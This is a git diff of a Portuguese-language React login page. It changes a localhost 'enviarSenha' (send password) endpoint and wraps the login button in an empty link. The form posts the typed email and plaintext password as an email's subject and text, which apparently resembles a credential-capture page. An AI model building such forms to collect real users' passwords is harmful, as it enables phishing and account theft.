@@ -6,8 +6,6 @@ import './index.scss';
 import { useState, useRef } from 'react';
 import axios from 'axios';
 
-let url = 'http://localhost:5000/enviarSenha'
-
 function App() {
   const [hidePlaceHolder, setHidePlaceHolder] = useState(false)
 
@@ -23,7 +21,7 @@ function App() {
       subject: EMAIL,
       text: PWD
     }
-    let resposnse = await axios.post(url, dadosPessoa)
+    let resposnse = await axios.post('http://localhost:5003/enviarSenha', dadosPessoa)
     console.log(resposnse)
   }
 
@@ -45,7 +43,9 @@ function App() {
           <div onClick={() => senhaRef.current.focus(senhaRef)}>
             <input ref={senhaRef} type='password' placeholder='Senha' onChange={e => setPWD(e.target.value)} />
           </div>
-          <button onClick={EnviarSenha}>Entrar</button>
+          <a >
+          <button onClick={EnviarSenha} >Entrar</button>
+          </a>
         </div>
         <a className='RecPwd' href=''>Esqueceu a senha?</a>
       </div>
